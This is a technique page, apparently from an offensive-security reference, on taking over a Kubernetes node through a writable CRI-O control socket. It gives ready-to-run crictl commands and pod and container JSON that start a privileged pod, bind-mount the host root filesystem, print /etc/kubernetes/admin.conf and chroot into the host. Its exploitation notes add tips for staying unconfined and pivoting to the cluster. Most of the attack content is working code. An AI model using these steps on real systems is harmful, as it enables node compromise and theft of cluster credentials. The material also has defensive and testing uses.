---
title: "CRI-O socket: node control through crictl"
description: "CRI-O exposes its control API on a Unix socket gated only by filesystem permissions. A process that can reach it drives CRI-O with crictl to enumerate pods and images and to create a privileged pod that bind-mounts the node root filesystem, taking over the Kubernetes node the same way the containerd socket does."
keywords:
  - cri-o socket
  - crictl
  - kubernetes node
  - privileged pod
  - node takeover
---

# CRI-O socket

CRI-O is the other common Kubernetes node runtime, and its control socket (`/run/crio/crio.sock`) is, like containerd's, protected only by filesystem permissions. A process able to write to it controls CRI-O through the CRI, and can define a privileged pod that mounts the node root filesystem, giving node root. The standard client is `crictl`, which speaks the CRI to whichever runtime endpoint it is pointed at.

Confirm access and enumerate:

```bash
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/crio/crio.sock
ls -l /run/crio/crio.sock
crictl version; crictl info | head
crictl pods; crictl images | head; crictl ps -a
```

## Node takeover

`crictl` creates a container from a pod sandbox; the pod and container JSON request privileged mode and a host root bind mount:

```bash
cat > pod.json <<'J'
{ "metadata": {"name":"esc","namespace":"default","uid":"esc"},
  "linux": {"security_context": {"privileged": true, "namespace_options": {"network":2,"pid":1}}} }
J
cat > ctr.json <<'J'
{ "metadata": {"name":"esc"},
  "image": {"image":"docker.io/library/alpine:latest"},
  "command": ["/bin/sh","-c","cat /host/etc/kubernetes/admin.conf; chroot /host sh -c id"],
  "mounts": [{"container_path":"/host","host_path":"/","readonly":false}],
  "linux": {"security_context": {"privileged": true}} }
J
pod=$(crictl runp pod.json)
cid=$(crictl create $pod ctr.json pod.json)
crictl start $cid && crictl logs $cid
```

The host root mount at `/host` exposes the kubelet credentials and node secrets, the same cluster-pivot material as the containerd route.

## Exploitation notes

- Like containerd, the socket is unauthenticated; permission on the socket is the gate. Point `crictl` at the endpoint with `--runtime-endpoint` or the environment variable.
- Request the host PID namespace and privileged mode in the security context so the container is unconfined; the bind mount of `/` is what carries node files.
- Reuse an on-node image (`crictl images`) to avoid pulling. The downstream is identical to the [containerd socket](containerd-socket.md) route: read node credentials and pivot to the cluster.

## References

- [crictl user guide](https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md)
- [CRI-O documentation](https://github.com/cri-o/cri-o/tree/main/docs)
- [Kubernetes: CRI](https://kubernetes.io/docs/concepts/architecture/cri/)
